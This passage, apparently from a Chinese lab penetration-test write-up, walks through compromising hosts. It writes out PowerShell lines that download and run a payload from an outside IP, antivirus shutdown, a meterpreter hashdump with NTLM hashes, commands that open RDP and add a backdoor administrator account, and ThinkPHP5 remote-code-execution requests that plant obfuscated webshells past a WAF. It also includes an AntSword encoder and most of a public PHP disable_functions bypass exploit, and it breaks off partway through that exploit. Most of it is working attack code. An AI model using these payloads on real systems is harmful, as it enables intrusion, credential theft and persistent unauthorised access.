alt="image-20231211151220461"></p><p>这里还是使用的掩日这个工具  选的模块就是网络隔离那一块就行了</p><p><img src="../images/image-20231211150756007.png" alt="image-20231211150756007"></p><p>生成好之后  刚开始是想尝试wget来上传文件  但是这里不知道为什么不行会报错</p><p>然后我们就换成了powershell来上传文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WebRequest -Uri &#x27;http://101.42.39.110:1234/4G0.exe&#x27; -OutFile &#x27;C:\\4G0.exe&#x27;</span><br><span class="line"></span><br><span class="line">//下面的那个是下载并执行ps1脚本的</span><br><span class="line">IEX (New-Object Net.WebClient).DownloadString(&#x27;https://example.com/script.ps1&#x27;)</span><br></pre></td></tr></table></figure><p>在成功上传文件之后</p><p><img src="../images/image-20231211151046296.png" alt="image-20231211151046296"></p><p>开启viper监听   然后上线主机 </p><p><code>start C:\\4G0.exe http://101.42.39.110:1234/4G0.txt</code>  </p><p><img src="../images/image-20231211151336409.png" alt="image-20231211151336409"></p><p><img src="../images/image-20231211151444064.png" alt="image-20231211151444064"></p><p>上线成功  我们先进去把杀软给关了先  (因为是system权限  所以杀软可以直接关闭)</p><p><img src="../images/image-20231211151609424.png" alt="image-20231211151609424"></p><p>再次查看tasklist  发现wdf已经杀掉了</p><p>hashdump</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:388f586516a4cba963b4181363b44034:::</span><br><span class="line">ash:1000:aad3b435b51404eeaad3b435b51404ee:96783bb69c00614e88f7d4688623c83a:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure><p>然后因为是外网主机   我们可以开启其3389端口  并且新加上一个本地管理员账户  然后RDP上去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /t REG_DWORD /v portnumber /d 3389 /f</span><br><span class="line"></span><br><span class="line">wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1</span><br><span class="line"></span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br><span class="line"></span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v UserAuthentication /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//上面的代码时开启3389端口的方法</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net user Ke1nys qwer1234! /add</span><br><span class="line">net localgroup administrators Ke1nys /add</span><br><span class="line"></span><br><span class="line">//添加本地管理员的方法</span><br></pre></td></tr></table></figure><p>然后RDP上去</p><p><img src="../images/image-20231211152240189.png" alt="image-20231211152240189"></p><p>成功RDP上去  于是开启信息收集  </p><p><img src="../images/image-20231211152447621.png" alt="image-20231211152447621"></p><p>在本地管理员桌面发现了文件  里面一堆地址  不知道有啥用  先下载下来</p><p><img src="../images/image-20231211152548732.png" alt="image-20231211152548732"></p><p>不在域中  </p><p><img src="../images/image-20231211152623233.png" alt="image-20231211152623233"></p><p>同样也是存在双网卡  并且呢这个 100段下的机器也是存在防火墙拦截  我们也是ping不通  于是还是使用fscan来扫描      这里直接使用msf的扫端口模块来扫出存活ip  然后再使用nmap来扫全都端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/portscan/tcp</span><br><span class="line"></span><br><span class="line">//使用这个命令的话  记得上内网路由  不然扫不出来</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20231211154253327.png" alt="image-20231211154253327"></p><p>一共是扫出两个存活ip  155是我们本机   然后131就是别的机器了  于是上fscan扫全端口看看 <strong>(我看别人的wp上写着是可以使用kscan来替代nmap   没试过  记录一下  下次可能用得着)</strong></p><p><img src="../images/image-20231211155335185.png" alt="image-20231211155335185"></p><p>访问80端口  </p><p><img src="../images/image-20231211154947846.png" alt="image-20231211154947846"></p><p>发现是400  很奇怪  然后扫一下目录啥也没扫到  卡住了…………………</p><p>访问8888端口</p><p><img src="../images/image-20231211155405644.png" alt="image-20231211155405644"></p><p>发现是宝塔搭建的  但是不知道后台路径  然后尝试爆破  也没啥东西被爆破出来  我们之前再那个啥获取到的这个地址  那个可能有用</p><p><img src="../images/image-20231211155619120.png" alt="image-20231211155619120"></p><p>然后我们就猜测是host碰撞</p><p><img src="../images/image-20231211155720872.png" alt="image-20231211155720872"></p><p>成功找到  这里使用的hostscan这个工具</p><p><img src="../images/image-20231211155819984.png" alt="image-20231211155819984"></p><p>但是发现就一个普通的登录框  啥用也没有  又卡住了……………………….</p><p>(应该是信息收集做的不到位  这里我们就想一下  这台机器可能访问过这个网站  浏览器中可能存在该后台地址  于是我们直接使用msf来收集一下浏览器的浏览记录)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/forensics/browser_history</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231211160243203.png" alt="image-20231211160243203"></p><p>存在该地址 于是翻看浏览器记录  终于是发现了该ip的正确地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http://192.168.100.131/vulntarget/thinkphp</span><br><span class="line">http://192.168.100.131/vulntarget/pubilc</span><br><span class="line">http://192.168.100.131/vulntarget/pubilc/123</span><br><span class="line">http://192.168.100.131/vulntarget/pubilc/index.php</span><br></pre></td></tr></table></figure><p>这是其存在的路径</p><p><img src="../images/image-20231211160429865.png" alt="image-20231211160429865"></p><p>thinkphp5的版本   然后找poc来打</p><p><img src="../images/image-20231211160601937.png" alt="image-20231211160601937"></p><p>但是呢  发现存在宝塔的防火墙  于是开始去找文件来进行绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][0]=1.php&amp;vars[1][1]=&lt;?php $url = &quot;php&quot;;$p =&quot;info();&quot;;$c=$url.$p;assert($c);?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//免杀马加路径写入  但是当前路径不可写</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231211161048304.png" alt="image-20231211161048304"></p><p>于是我们写到别的目录下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][0]=../../1.php&amp;vars[1][1]=&lt;?php $url = &quot;php&quot;;$p =&quot;info();&quot;;$c=$url.$p;assert($c);?&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231211161327588.png" alt="image-20231211161327588"></p><p>没有被拦下  猜测成功写入  然后我们可以写免杀马进去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http://192.168.100.131/vulntarget/public/?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][0]=../../1.php&amp;vars[1][1]=%3C?php%20eval(urldecode(urldecode(urldecode($_REQUEST[cmd]))));?%3E</span><br></pre></td></tr></table></figure><p><strong>(其实这里能写入的原因就是assert和eval居然都没过滤  很奇怪)</strong></p><p>然后因为我们这里是三层urldecode  所以需要重新定义蚁剑的连接编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x27;use strict&#x27;;</span><br><span class="line"></span><br><span class="line">  // ##########    请在下方编写你自己的代码   ###################</span><br><span class="line">function forceEncode(s) &#123;</span><br><span class="line">  return Array.from(s).map(i=&gt;&#x27;%&#x27;+i.charCodeAt(0).toString(16).padStart(2,&#x27;0&#x27;)).join(&#x27;&#x27;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module.exports = (pwd, data, ext=&#123;&#125;) =&gt; &#123;</span><br><span class="line">  const payload = data[&#x27;_&#x27;]</span><br><span class="line">  data[pwd] = forceEncode(forceEncode(payload));</span><br><span class="line">  delete data[&#x27;_&#x27;];</span><br><span class="line">  console.log(data);</span><br><span class="line">  return data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231211161651441.png" alt="image-20231211161651441"></p><p>还有就是记得连接的时候加上host头  不然会连接失败</p><p><img src="../images/image-20231211162136769.png" alt="image-20231211162136769"></p><p>然后成功进行连接  但是这里使用蚁剑自带的disable_function插件绕不过去  于是我们就用马来进行绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Bug: https://bugs.php.net/bug.php?id=72530</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.3 versions</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ryat</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$ryat</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$chtg</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;chtg = <span class="variable language_">$this</span>-&gt;ryat;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;ryat = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;A&#x27;</span>, 